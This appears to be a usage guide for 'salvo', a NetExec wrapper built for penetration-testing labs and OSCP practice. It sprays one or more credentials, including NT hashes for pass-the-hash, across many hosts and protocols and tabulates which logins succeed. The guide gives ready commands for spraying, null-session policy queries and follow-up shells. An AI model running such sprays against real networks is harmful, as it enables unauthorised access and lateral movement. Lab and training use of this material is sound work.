# SALVO — Usage

Wrapper around `nxc` that fires every protocol at once instead of one at a time, and prints the credential reuse matrix from [[AD_METHOD]] section 5 as a table.

It only ever authenticates. It never passes `-x`, `-X`, `-M`, `--sam`, `--lsa` or `--ntds` to nxc — it logs in, reports, and stops.

> Think of it like: trying every key on every door at the same time, then writing down which doors opened, which were bolted from the inside, and which you could not tell.

---

## 1. Install

```bash
# === ONE-TIME SETUP ===
install -m 755 salvo.py ~/bin/salvo   # ~/bin is already on PATH from .zshrc (same place as `report`)
salvo --help                          # confirms it runs; stdlib only, no pip, no venv, no PEP 668
```

No dependencies beyond `nxc` itself being on PATH.

---

## 2. The command you will actually run

The moment you hold one credential and know more than one host. This is the whole point of the tool.

> Think of it like: the first thing you do after picking up a key is walk the corridor, not stare at the key.

```bash
# === ONE CREDENTIAL, EVERY PROTOCOL, EVERY HOST ===
salvo <TARGET_RANGE> -u '<USER>' -p '<PASS>' -d <DOMAIN>
# <TARGET_RANGE>  IPs, ranges, CIDRs, hostnames, or a file — anything nxc accepts
# -u <USER>       the account
# -p <PASS>       the password
# -d <DOMAIN>     domain authentication; omit and use --local-auth for a local account

# e.g.: salvo 192.168.100.0/24 -u 'jdoe' -p 'Password123!' -d corp.local
```

Default protocol set is `smb,winrm,wmi,mssql,ldap,rdp,ssh,ftp`. Every one runs concurrently.

---

## 3. The four credential modes

Everything you can hand it. A hash is auto-detected in a creds file — 32 hex characters, or the `LM:NT` pair form.

> Think of it like: one key, one skeleton key, a whole keyring, or the same keyring tried on both the building lock and the flat lock.

```bash
# === MODE 1 — SINGLE PASSWORD, DOMAIN AUTH ===
salvo <TARGET_RANGE> -u '<USER>' -p '<PASS>' -d <DOMAIN>
# e.g.: salvo 192.168.100.0/24 -u 'jdoe' -p 'Password123!' -d corp.local

# === MODE 2 — SINGLE NT HASH, LOCAL AUTH (the windows.old / SAM case) ===
salvo <TARGET_IP> <TARGET_IP> <DC_IP> -u 'Administrator' -H <HASH> --local-auth
# -H <HASH>       NT hash, pass-the-hash
# --local-auth    treat it as a LOCAL account, not a domain one
# e.g.: salvo 192.168.100.25 192.168.100.26 192.168.100.10 -u 'Administrator' -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# === MODE 3 — EVERY CREDENTIAL YOU HOLD, FROM A FILE ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN>
# -C creds.txt    one user:secret per line, hashes auto-detected
# e.g.: salvo 192.168.100.0/24 -C creds.txt -d corp.local

# === MODE 4 — SAME CREDS, BOTH AUTH SCOPES ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --both-auth
# --both-auth     runs every credential twice: once as domain, once as --local-auth
# e.g.: salvo 192.168.100.0/24 -C creds.txt -d corp.local --both-auth
```

`creds.txt` format — blank lines and `#` comments ignored:

```
jdoe:Password123!
Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
CORP\svc_sql:Winter2026!
```

Duplicate credentials and duplicate targets are dropped before dispatch. A repeated credential is another failed logon against the lockout counter for nothing.

---

## 4. Reading the matrix

This is the part that matters. **Three verdict buckets, not two.** Most tools have "worked" and "failed", and collapsing everything else into "failed" is how a live credential gets thrown away.

> Think of it like: a locked door, a door that opened, and a door where you genuinely cannot tell whether it was locked or you were just not allowed in. The third one is not a no.

```
host                       smb   winrm     wmi   mssql    ldap     rdp     ssh     ftp
--------------------------------------------------------------------------------------
192.168.100.10 (DC01)       ok       ?       ?      ok      ok  VALID*       -       - <
192.168.100.25 (WEB01)   PWN3D       ?       ?      ok      ok  VALID*       .       . <
192.168.100.26 (SQL01)      ok       ?       ?   PWN3D      ok  VALID*       -       - <
```

| glyph    | meaning | what to do |
|---|---|---|
| `PWN3D`  | authenticated **with admin rights** | take the shell, it is in the NEXT block |
| `ok`     | authenticated, not admin | read shares, enumerate, it is still access |
| `VALID*` | **password is correct**, this access path is closed | account is live — try it somewhere else |
| `?`      | refused with no reason given, cannot be told apart from an authz denial | do **not** write the cred off |
| `.`      | confirmed wrong credential | done with it on that protocol |
| `-`      | no service / no answer on that host | port closed, ignore |
| `LOCK!`  | account lockout hit | stop, everything was killed |

A `<` at the end of a row means that host produced at least one non-refusal.

`VALID*` covers `STATUS_LOGON_TYPE_NOT_GRANTED`, `STATUS_ACCOUNT_DISABLED`, `STATUS_PASSWORD_EXPIRED`, `STATUS_PASSWORD_MUST_CHANGE`, workstation and logon-hour restrictions. All of them mean the password checked out.

`?` is mostly WinRM. **A WinRM refusal is not an invalid credential** — an account that is valid but not in Remote Management Users looks byte-identical to a wrong password. That was MS02 in Challenge 5, and it is the single most expensive misread in the whole matrix.

Under the matrix you get two blocks automatically:

- **NOT A VERDICT** — every `VALID*` and `?` result with the reason, grouped. A credential in that list is still live.
- **NEXT** — the follow-up command per host, best access first: `evil-winrm`, `impacket-psexec`, `impacket-mssqlclient`, `xfreerdp3`, `ssh`, and the LDAP BloodHound and kerberoast lines once for the domain.

---

## 5. Over a tunnel

Default settings will hammer a Ligolo tunnel and time everything out. Use the preset.

> Think of it like: the same salvo, fired slower, because the barrel is a straw.

```bash
# === PIVOTED / SLOW LINK ===
salvo <INTERNAL_RANGE> -C creds.txt -d <DOMAIN> --slow
# --slow    preset: --parallel 3, --nxc-threads 5, --nxc-timeout 30
# e.g.: salvo 10.10.100.0/24 -C creds.txt -d corp.local --slow

# === MANUAL TUNING IF --slow IS STILL TOO MUCH ===
salvo <INTERNAL_RANGE> -C creds.txt -d <DOMAIN> --parallel 2 --nxc-threads 3 --nxc-timeout 45 --jitter 1-3
# --parallel      concurrent nxc processes (default 6)
# --nxc-threads   nxc's own -t per process (default 25)
# --nxc-timeout   nxc --timeout seconds (default 15)
# --jitter        random delay between connections
# e.g.: salvo 10.10.100.0/24 -C creds.txt -d corp.local --parallel 2 --nxc-threads 3 --nxc-timeout 45 --jitter 1-3
```

Ligolo route must already be up. Nothing here tunnels for you.

---

## 6. Resume after a crash

The one that matters when the VM hangs. Add `--state` to the first run and every re-run is free.

> Think of it like: ticking doors off a list. Coming back after the power cut, you start at the first unticked door, not the first door.

```bash
# === FIRST RUN — records what it answered ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --state .salvo.state
# --state FILE   resume store; jobs answered here are skipped on the next run
# e.g.: salvo 10.10.100.0/24 -C creds.txt -d corp.local --state .salvo.state

# === VM HANGS. REBUILD SESSION. RE-RUN THE IDENTICAL COMMAND ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --state .salvo.state
# skipped jobs cost zero network traffic and zero lockout counter
# their earlier results are merged back in, so the matrix is still complete

# === START A SCOPE OVER ===
salvo --state .salvo.state --forget    # deletes the resume file and exits
```

Each job is keyed on a hash of the credential, the protocol, **and** the target list. Change any of those and the signature changes, so a moved scope is never silently skipped.

A job is only recorded as done if nxc exited cleanly and the run was not aborted. Killed, crashed and lockout-aborted jobs stay unrecorded and retry. It fails toward re-running, never toward silently dropping a host.

Ctrl-C does not throw the run away — it kills the processes, then still prints the matrix and writes the state from what it had.

---

## 7. Lockout safety

Every protocol is a separate authentication attempt. Eight protocols is eight failed logons per account. Default AD threshold is often five. Do the arithmetic **before** you spray a domain.

> Think of it like: a 7×7 matrix is 49 attempts per account. Count first.

```bash
# === ALWAYS CHECK THE POLICY FIRST, BEFORE ANY SPRAY ===
nxc smb <DC_IP> -u '' -p '' --pass-pol   # null session often gives it up for free
# e.g.: nxc smb 192.168.100.10 -u '' -p '' --pass-pol

# === IF THE THRESHOLD IS TIGHT, NARROW THE PROTOCOL SET ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> -P smb,winrm
# -P    comma list, or 'all'. Fewer protocols = fewer logons per account
# e.g.: salvo 192.168.100.0/24 -C creds.txt -d corp.local -P smb,winrm
```

salvo prints `LOCKOUT MATH` before starting whenever any account would take more than three logons in that run. If any host returns `STATUS_ACCOUNT_LOCKED_OUT` mid-run it kills every remaining process immediately rather than finishing the sweep. `--no-lockout-guard` disables that; there is no good reason to use it in a lab or an exam.

Hash credentials automatically skip `ssh`, `ftp`, `nfs` and `vnc` — you cannot pass-the-hash over those.

---

## 8. Evidence for the report

Everything needed to write the finding up later, without re-running anything.

> Think of it like: the screenshot is the proof, the log is the receipt, and the dry-run is the methodology section.

```bash
# === FULL EVIDENCE RUN ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --logdir ./nxclogs --json salvo.json --markdown
# --logdir DIR    raw nxc output, one file per credential+protocol, for the appendix
# --json FILE     every result as structured data
# --markdown      prints the matrix as an Obsidian table instead of fixed-width

# === THE COMMANDS, WITHOUT RUNNING THEM — paste straight into the report ===
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --dry-run
# e.g.: salvo 192.168.100.0/24 -C creds.txt -d corp.local --dry-run
```

Log filenames carry a fingerprint of the credential, so two different passwords for the same user never overwrite each other's evidence. Logs and JSON are overwritten on re-run, never appended.

`--quiet` suppresses the live result lines and prints only the final matrix.

---

## 9. Where it sits in The Loop

[[AD_METHOD]] section 5 is the credential reuse matrix. salvo is that section, executed.

The rule is unchanged: **re-enter the loop on every new credential, hash, shell or host.** Every time you pick up something new, salvo runs again with the new cred appended to `creds.txt`, and the `--state` file means the old answers cost nothing.

```bash
# === THE LOOP, MECHANICALLY ===
# 1. new credential lands anywhere
echo 'new_user:NewPassword1' >> creds.txt

# 2. re-run — old jobs skipped, only the new credential is actually sprayed
salvo <TARGET_RANGE> -C creds.txt -d <DOMAIN> --state .salvo.state

# 3. read the NEXT block, take the best access, mark the node owned in BloodHound
# 4. go to AD_METHOD section 3.1 — outbound edges from owned
```

Marking owned nodes in BloodHound is still manual and still the step that gets skipped. salvo does not do it for you.

---

## Full flag reference

| flag | default | what it does |
|---|---|---|
| `<targets>` | — | IPs, ranges, CIDRs, hostnames, or a file |
| `-u`, `--user` | — | single username |
| `-p`, `--password` | — | single password |
| `-H`, `--hash` | — | single NT hash, pass-the-hash |
| `-C`, `--creds` | — | file of `user:secret` lines |
| `-d`, `--domain` | — | domain authentication |
| `--local-auth` | off | authenticate as a LOCAL account |
| `--both-auth` | off | run every credential domain **and** local |
| `-P`, `--protocols` | `smb,winrm,wmi,mssql,ldap,rdp,ssh,ftp` | comma list, or `all` |
| `--parallel` | 6 | concurrent nxc processes |
| `--nxc-threads` | 25 | nxc's own `-t` per process |
| `--nxc-timeout` | 15 | nxc `--timeout` seconds |
| `--jitter` | — | nxc `--jitter` value |
| `--slow` | off | tunnel preset: 3 / 5 / 30 |
| `--markdown` | off | matrix as an Obsidian table |
| `--json` | — | write all results as JSON |
| `--logdir` | — | raw nxc output per job |
| `--quiet` | off | suppress live lines |
| `--dry-run` | off | print the nxc commands, run nothing |
| `--state` | — | resume file |
| `--no-resume` | off | ignore existing state, still record new |
| `--forget` | off | delete the state file and exit |
| `--no-lockout-guard` | off | do not abort on lockout |
| `--nxc-bin` | `nxc` | path to nxc |

---

## Notes

- Same arguments in, same bytes out. Results are sorted, never printed in thread order, so two runs diff cleanly.
- Run it on HTB before it ever sees an exam. A mangled parse costs nothing on Zephyr.
- Confirm the current OSCP restricted-tooling rules yourself. The design intent is that this is a scheduler for a tool already permitted manually, but that is a reading, not a ruling.

## Links

- NetExec protocol list — https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
- NetExec multi-protocol feature request (still open) — https://github.com/Pennyw0rth/NetExec/issues/1249
